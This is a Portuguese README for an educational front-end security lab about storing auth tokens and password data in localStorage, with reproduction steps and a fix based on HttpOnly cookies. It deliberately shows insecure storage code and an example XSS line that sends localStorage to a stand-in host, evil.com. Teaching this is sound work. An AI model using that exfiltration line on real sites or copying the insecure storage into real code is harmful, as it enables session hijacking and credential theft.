# 🟣 Lab 04 — localStorage Inseguro

> **Série DevQuest Security Labs** · Nível 1 · Front-End


## Objetivo

Demonstrar que armazenar **tokens de autenticação e dados sensíveis no `localStorage`** os expõe a roubo via XSS — e mostrar a alternativa correta com `httpOnly cookies`.


## A Vulnerabilidade

**Tipo:** Sensitive Data Exposure via localStorage  
**CWE:** CWE-922 — Insecure Storage of Sensitive Information

// ❌ INSEGURO
localStorage.setItem('jwt_token', token);
localStorage.setItem('user_pass_hash', btoa(senha));

// Qualquer script XSS pode roubar com:
fetch('https://evil.com?data=' + btoa(JSON.stringify(localStorage)));


## Como Reproduzir

1. Abra `vulnerable/index.html` e faça login
2. No DevTools → Application → Local Storage — confirme os dados
3. Clique em **☠ SIMULAR ATAQUE XSS** para ver os dados roubados
4. Ou no console: `console.log(JSON.stringify(localStorage))`


## Impacto

- Token roubado → sequestro de sessão
- Credenciais expostas → acesso à conta
- Persiste após fechar a aba (diferente de sessionStorage)
- Acessível por scripts de terceiros (ads, analytics comprometidos)


## A Correção

Servidor → Set-Cookie: jwt=TOKEN; HttpOnly; Secure; SameSite=Strict

- `HttpOnly` → inacessível ao JavaScript
- `Secure` → só enviado via HTTPS
- `SameSite=Strict` → protege contra CSRF

**O que pode ir para localStorage:** preferências de UI, tema, idioma — nada sensível.


## Boas Práticas

- ✅ Tokens de autenticação → httpOnly cookies
- ✅ Nunca salve senhas ou hashes no client
- ✅ localStorage = memória pública da página
- ✅ Combine httpOnly cookies com CSP para defesa em profundidade


## 🌐 Live Demo

| Versão | Link |
| ⚠️ Vulnerável | [/vulnerable](./vulnerable/index.html) |
| ✅ Corrigida   | [/fixed](./fixed/index.html) |

*DevQuest Security Labs · Laboratório educacional*
